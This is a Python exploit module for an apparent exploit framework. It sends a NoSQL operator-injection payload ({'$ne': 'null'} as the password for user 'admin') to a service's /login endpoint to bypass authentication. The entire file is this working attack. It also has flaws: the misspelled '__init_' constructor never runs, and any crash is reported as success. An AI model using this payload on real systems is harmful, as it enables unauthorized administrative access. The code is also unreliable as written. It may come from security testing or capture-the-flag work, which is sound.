
from ExploitFrame import ExploitFrame
import requests
import structlog

logger = structlog.get_logger()

class Exploit(ExploitFrame):
    def __init_(self, serviceInfo):
        self.name = 'nosql_exploit'
        self.output = None
        ExploitFrame.__init__(self, serviceInfo)

    def exploit(self):
        url = 'http://{}:{}/login'.format(self.serviceInfo.serviceHost,self.serviceInfo.servicePort)
        data = {"username": "admin", "password": {"$ne": "null"}}

        try:
            exp = requests.post(url, json=data)
            if 'Login Failed' in exp.text:
                logger.info('Nosql Exploit', msg='Login Failed', serviceInfo=self.serviceInfo.__dict__)
                self.output = False
            else:
                self.output = True

        except Exception as e:
            msg = "Exploit crashed: {}".format(e)
            logger.info('Nosql Exploit', msg=msg, serviceInfo=self.serviceInfo.__dict__)
            self.output = True

    def exploitSuccess(self):
        return self.output
